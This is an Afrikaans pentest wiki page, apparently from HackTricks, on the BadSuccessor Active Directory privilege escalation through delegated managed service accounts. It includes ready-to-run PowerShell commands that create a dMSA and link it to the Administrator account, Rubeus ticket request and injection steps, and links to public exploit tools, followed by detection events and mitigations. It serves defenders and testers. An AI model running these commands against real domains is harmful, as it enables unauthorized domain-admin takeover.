# BadSuccessor: Privilege Escalation via Misbruik van Gedelegeerde MSA-migrasie

{{#include ../../banners/hacktricks-training.md}}

## Oorsig

Delegated Managed Service Accounts (**dMSA**) is die volgende-generasie opvolger van **gMSA** wat in Windows Server 2025 ingesluit is.  'n Geldige migrasiewerkvloei stel administrateurs in staat om 'n *ou* rekening (gebruiker-, rekenaar- of diensrekening) met 'n dMSA te vervang terwyl toestemmings deursigtig behoue bly.  Die werkvloei word blootgestel deur PowerShell-cmdlets soos `Start-ADServiceAccountMigration` en `Complete-ADServiceAccountMigration` en maak staat op twee LDAP-attributed van die **dMSA-objek**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN-skakel* na die rekening wat vervang is (die ou rekening).
* **`msDS-DelegatedMSAState`**       – migrasietoestand (`0` = geen, `1` = aan die gang, `2` = *voltooi*).<sup>[[1]](#references)</sup>

As 'n aanvaller enige dMSA binne 'n OU kan skep en daardie 2 attribute direk kan manipuleer, sal LSASS & die KDC die dMSA as 'n *opvolger* van die gekoppelde rekening hanteer.  Wanneer die aanvaller daarna as die dMSA authenticateer, **erf** hulle al die voorregte van die gekoppelde rekening – tot by **Domain Admin** indien die Administrator-rekening gekoppel is.<sup>[[1]](#references)</sup>

Hierdie tegniek is in 2025 deur Unit 42 **BadSuccessor** genoem.  Ten tyde van skrywe is **geen sekuriteitspleister** beskikbaar nie; slegs die hardening van OU-toestemmings versag die probleem.<sup>[[1]](#references)[[2]](#references)</sup>

### Aanvalvoorvereistes

1. 'n Rekening wat *toegelaat* word om objekte binne **'n Organizational Unit (OU)** te skep *en* ten minste een van die volgende het:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`**-objekklas
* `Create Child` → **`All Objects`** (generiese skepping)
2. Netwerkverbinding met LDAP & Kerberos (standaard domein-joined-scenario / afgeleë aanval).<sup>[[1]](#references)</sup>

## Opsomming van Kwesbare OUs

Unit 42 het 'n PowerShell-helper script vrygestel wat die security descriptors van elke OU ontleed en die vereiste ACEs uitlig:<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
In die agtergrond voer die script ’n paginering-LDAP-soektog vir `(objectClass=organizationalUnit)` uit en kontroleer elke `nTSecurityDescriptor` vir

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (object class *msDS-DelegatedManagedServiceAccount*)

## Uitbuitingstappe

Sodra ’n skryfbare OU geïdentifiseer is, is die aanval slegs 3 LDAP writes weg:<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Ná replisering kan die aanvaller eenvoudig as `attacker_dMSA$` **logon** of ’n Kerberos TGT aanvra – Windows sal die token van die *superseded* account bou.<sup>[[1]](#references)</sup>

### Outomatisering

Verskeie publieke PoCs omvat die volledige workflow, insluitend password retrieval en ticket management:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Opsporing en Jag

Aktiveer **Object Auditing** op OUs en monitor die volgende Windows Security Events:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – Skepping van die **dMSA**-objek
* **5136** – Wysiging van **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Spesifieke kenmerkveranderings
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – TGT-uitreiking vir die dMSA

Deur `4662` (kenmerkwysiging), `4741` (skepping van ’n rekenaar-/diensrekening) en `4624` (daaropvolgende aanmelding) te korreleer, word BadSuccessor-aktiwiteit vinnig uitgelig. XDR-oplossings soos **XSIAM** word met gereed-vir-gebruik-navrae verskaf (sien verwysings).<sup>[[2]](#references)</sup>

## Mitigering

* Pas die beginsel van **minste voorregte** toe – delegeer *Service Account*-bestuur slegs aan vertroude rolle.
* Verwyder `Create Child` / `msDS-DelegatedManagedServiceAccount` uit OUs wat dit nie uitdruklik benodig nie.
* Monitor die gebeurtenis-ID's hierbo en genereer waarskuwings wanneer *nie-Tier-0*-identiteite dMSAs skep of wysig.

## Sien ook


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## Verwysings

- [1] [BadSuccessor: Misbruik van dMSA om voorregte in Active Directory te eskaleer – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Wanneer goeie rekeninge sleg word: Uitbuiting van Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
